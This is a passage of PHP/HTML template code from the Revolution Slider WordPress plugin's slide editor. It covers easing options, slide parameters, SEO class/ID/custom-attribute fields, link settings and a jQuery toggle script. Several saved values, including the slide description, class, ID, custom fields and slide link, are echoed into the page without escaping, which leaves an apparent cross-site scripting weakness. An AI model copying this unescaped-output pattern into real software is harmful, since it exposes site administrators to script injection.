									<option value="Back.easeOut">Back.easeOut</option>
									<option value="Bounce.easeIn">Bounce.easeIn</option>
									<option value="Bounce.easeInOut">Bounce.easeInOut</option>
									<option value="Bounce.easeOut">Bounce.easeOut</option>
									<option value="Circ.easeIn">Circ.easeIn</option>
									<option value="Circ.easeInOut">Circ.easeInOut</option>
									<option value="Circ.easeOut">Circ.easeOut</option>
									<option value="Elastic.easeIn">Elastic.easeIn</option>
									<option value="Elastic.easeInOut">Elastic.easeInOut</option>
									<option value="Elastic.easeOut">Elastic.easeOut</option>
									<option value="Expo.easeIn">Expo.easeIn</option>
									<option value="Expo.easeInOut">Expo.easeInOut</option>
									<option value="Expo.easeOut">Expo.easeOut</option>
									<option value="Sine.easeIn">Sine.easeIn</option>
									<option value="Sine.easeInOut">Sine.easeInOut</option>
									<option value="Sine.easeOut">Sine.easeOut</option>
									<option value="SlowMo.ease">SlowMo.ease</option>
							</select>
							<span class="tp-clearfix"></span>
							<span class="description"><?php _e("The easing of Disappearing transition.",REVSLIDER_TEXTDOMAIN); ?></span>
							
						</div>

					</div>
					
				</div>

				
			</div>
			
			<!-- SLIDE BASIC INFORMATION -->
			<div id="slide-info-settings-content" style="display:none">
				<p>
					<?php
					for($i=1;$i<=10;$i++){
						?>
						<p>
							<?php _e('Parameter', REVSLIDER_TEXTDOMAIN); echo ' '.$i; ?> <input type="text" name="params_<?php echo $i; ?>" value="<?php echo stripslashes(esc_attr(RevSliderFunctions::getVal($slideParams, 'params_'.$i,''))); ?>">
							<?php _e('Max. Chars', REVSLIDER_TEXTDOMAIN); ?> <input type="text" style="width: 50px; min-width: 50px;" name="params_<?php echo $i; ?>_chars" value="<?php echo esc_attr(RevSliderFunctions::getVal($slideParams, 'params_'.$i.'_chars',10, RevSlider::FORCE_NUMERIC)); ?>">
							<?php if($slider_type !== 'gallery'){ ?><i class="eg-icon-pencil rs-param-meta-open" data-curid="<?php echo $i; ?>"></i><?php } ?>
						</p>
						<?php
					}
					?>
				</p>
				<!-- BASIC DESCRIPTION -->
				<p>
					<?php $slide_description = stripslashes(RevSliderFunctions::getVal($slideParams, 'slide_description', '')); ?>
					<label><?php _e("Description of Slider:",REVSLIDER_TEXTDOMAIN); ?></label>

					<textarea name="slide_description" style="height: 425px; width: 100%"><?php echo $slide_description; ?></textarea>
					<span class="description"><?php _e('Define a description here to show at the navigation if enabled in Slider Settings',REVSLIDER_TEXTDOMAIN); ?></span>
				</p>
			</div>

			<!-- SLIDE SEO INFORMATION -->
			<div id="slide-seo-settings-content" style="display:none">
				<!-- CLASS -->
				<p>
					<?php $class_attr = RevSliderFunctions::getVal($slideParams, 'class_attr',''); ?>
					<label><?php _e("Class:",REVSLIDER_TEXTDOMAIN); ?></label>
					<input type="text" class="" id="class_attr" name="class_attr" value="<?php echo $class_attr; ?>">
					<span class="description"><?php _e('Adds a unique class to the li of the Slide like class="rev_special_class" (add only the classnames, seperated by space)',REVSLIDER_TEXTDOMAIN); ?></span>
				</p>

				<!-- ID -->
				<p>
					<?php $id_attr = RevSliderFunctions::getVal($slideParams, 'id_attr',''); ?>
					<label><?php _e("ID:",REVSLIDER_TEXTDOMAIN); ?></label>
					<input type="text" class="" id="id_attr" name="id_attr" value="<?php echo $id_attr; ?>">
					<span class="description"><?php _e('Adds a unique ID to the li of the Slide like id="rev_special_id" (add only the id)',REVSLIDER_TEXTDOMAIN); ?></span>
				</p>

				<!-- CUSTOM FIELDS -->
				<p>
					<?php $data_attr = stripslashes(RevSliderFunctions::getVal($slideParams, 'data_attr','')); ?>
					<label><?php _e("Custom Fields:",REVSLIDER_TEXTDOMAIN); ?></label>
					<textarea id="data_attr" name="data_attr"><?php echo $data_attr; ?></textarea>
					<span class="description"><?php _e('Add as many attributes as you wish here. (i.e.: data-layer="firstlayer" data-custom="somevalue").',REVSLIDER_TEXTDOMAIN); ?></span>
				</p>

				<!-- Enable Link -->
				<p>
					<?php $enable_link = RevSliderFunctions::getVal($slideParams, 'enable_link','false'); ?>
					<label><?php _e("Enable Link:",REVSLIDER_TEXTDOMAIN); ?></label>
					<select id="enable_link" name="enable_link">
						<option value="true"<?php selected($enable_link, 'true'); ?>><?php _e("Enable",REVSLIDER_TEXTDOMAIN); ?></option>
						<option value="false"<?php selected($enable_link, 'false'); ?>><?php _e("Disable",REVSLIDER_TEXTDOMAIN); ?></option>
					</select>
					<span class="description"><?php _e('Link the Full Slide to an URL or Action.',REVSLIDER_TEXTDOMAIN); ?></span>
				</p>
				
				<div class="rs-slide-link-setting-wrapper">
					<!-- Link Type -->
					<p>
						<?php $enable_link = RevSliderFunctions::getVal($slideParams, 'link_type','regular'); ?>
						<label><?php _e("Link Type:",REVSLIDER_TEXTDOMAIN); ?></label>
						<span style="display:inline-block; width:200px; margin-right:20px;">
							<input type="radio" id="link_type_1" value="regular" name="link_type"<?php checked($enable_link, 'regular'); ?>><span style="line-height:30px; vertical-align: middle; margin:0px 20px 0px 10px;"><?php _e('Regular',REVSLIDER_TEXTDOMAIN); ?></span>
							<input type="radio" id="link_type_2" value="slide" name="link_type"<?php checked($enable_link, 'slide'); ?>><span style="line-height:30px; vertical-align: middle; margin:0px 20px 0px 10px;"><?php _e('To Slide',REVSLIDER_TEXTDOMAIN); ?></span>
						</span>
						<span class="description"><?php _e('Regular - Link to URL,  To Slide - Call a Slide Action',REVSLIDER_TEXTDOMAIN); ?></span>
					</p>

					<div class="rs-regular-link-setting-wrap">
						<!-- SLIDE LINK -->
						<p>
							<?php $val_link = RevSliderFunctions::getVal($slideParams, 'link',''); ?>
							<label><?php _e("Slide Link:",REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="text" id="rev_link" name="link" value="<?php echo $val_link; ?>">
							<span class="description"><?php _e('A link on the whole slide pic (use {{link}} or {{meta:somemegatag}} in template sliders to link to a post or some other meta)',REVSLIDER_TEXTDOMAIN); ?></span>
						</p>
					
						<!-- LINK TARGET -->
						<p>
							<?php $link_open_in = RevSliderFunctions::getVal($slideParams, 'link_open_in','same'); ?>
							<label><?php _e("Link Target:",REVSLIDER_TEXTDOMAIN); ?></label>
							<select id="link_open_in" name="link_open_in">
								<option value="same"<?php selected($link_open_in, 'same'); ?>><?php _e('Same Window',REVSLIDER_TEXTDOMAIN); ?></option>
								<option value="new"<?php selected($link_open_in, 'new'); ?>><?php _e('New Window',REVSLIDER_TEXTDOMAIN); ?></option>
							</select>
							<span class="description"><?php _e('The target of the slide link.',REVSLIDER_TEXTDOMAIN); ?></span>
						</p>
					</div>
					<!-- LINK TO SLIDE -->
					<p class="rs-slide-to-slide">
						<?php $slide_link = RevSliderFunctions::getVal($slideParams, 'slide_link','nothing');
						//num_slide_link
						$arrSlideLink = array();
						$arrSlideLink["nothing"] = __("-- Not Chosen --",REVSLIDER_TEXTDOMAIN);
						$arrSlideLink["next"] = __("-- Next Slide --",REVSLIDER_TEXTDOMAIN);
						$arrSlideLink["prev"] = __("-- Previous Slide --",REVSLIDER_TEXTDOMAIN);

						$arrSlideLinkLayers = $arrSlideLink;
						$arrSlideLinkLayers["scroll_under"] = __("-- Scroll Below Slider --",REVSLIDER_TEXTDOMAIN);
						$arrSlideNames = array();
						if(isset($slider) && $slider->isInited())
							$arrSlideNames = $slider->getArrSlideNames();
						if(!empty($arrSlideNames) && is_array($arrSlideNames)){
							foreach($arrSlideNames as $slideNameID=>$arr){
								$slideName = $arr["title"];
								$arrSlideLink[$slideNameID] = $slideName;
								$arrSlideLinkLayers[$slideNameID] = $slideName;
							}
						}
						?>
						<label><?php _e("Link To Slide:",REVSLIDER_TEXTDOMAIN); ?></label>
						<select id="slide_link" name="slide_link">
							<?php
							if(!empty($arrSlideLinkLayers) && is_array($arrSlideLinkLayers)){
								foreach($arrSlideLinkLayers as $link_handle => $link_name){
									$sel = ($link_handle == $slide_link) ? ' selected="selected"' : '';
									echo '<option value="'.$link_handle.'"'.$sel.'>'.$link_name.'</option>';
								}
							}
							?>
						</select>
						<span class="description"><?php _e('Call Slide Action',REVSLIDER_TEXTDOMAIN); ?></span>
					</p>
					<!-- Link POSITION -->
					<p>
						<?php $link_pos = RevSliderFunctions::getVal($slideParams, 'link_pos','front'); ?>
						<label><?php _e("Link Sensibility:",REVSLIDER_TEXTDOMAIN); ?></label>
						<span style="display:inline-block; width:200px; margin-right:20px;">
							<input type="radio" id="link_pos_1" value="front" name="link_pos"<?php checked($link_pos, 'front'); ?>><span style="line-height:30px; vertical-align: middle; margin:0px 20px 0px 10px;"><?php _e('Front',REVSLIDER_TEXTDOMAIN); ?></span>
							<input type="radio" id="link_pos_2" value="back" name="link_pos"<?php checked($link_pos, 'back'); ?>><span style="line-height:30px; vertical-align: middle; margin:0px 20px 0px 10px;"><?php _e('Back',REVSLIDER_TEXTDOMAIN); ?></span>
						</span>
						<span class="description"><?php _e('The z-index position of the link related to layers',REVSLIDER_TEXTDOMAIN); ?></span>
					</p>
				</div>
			</div>

		</form>

	</div>
</div>
<script type="text/javascript">
	var rs_plugin_url = '<?php echo RS_PLUGIN_URL; ?>';
	
	jQuery('document').ready(function() {
		
		jQuery('#enable_link').change(function(){
			if(jQuery(this).val() == 'true'){
				jQuery('.rs-slide-link-setting-wrapper').show();
			}else{
				jQuery('.rs-slide-link-setting-wrapper').hide();
			}
		});
		jQuery('#enable_link option:selected').change();
		
		jQuery('input[name="link_type"]').change(function(){
			if(jQuery(this).val() == 'regular'){
				jQuery('.rs-regular-link-setting-wrap').show();
				jQuery('.rs-slide-to-slide').hide();
			}else{
				jQuery('.rs-regular-link-setting-wrap').hide();
				jQuery('.rs-slide-to-slide').show();
			}
		});
		jQuery('input[name="link_type"]:checked').change();
		
	});
</script>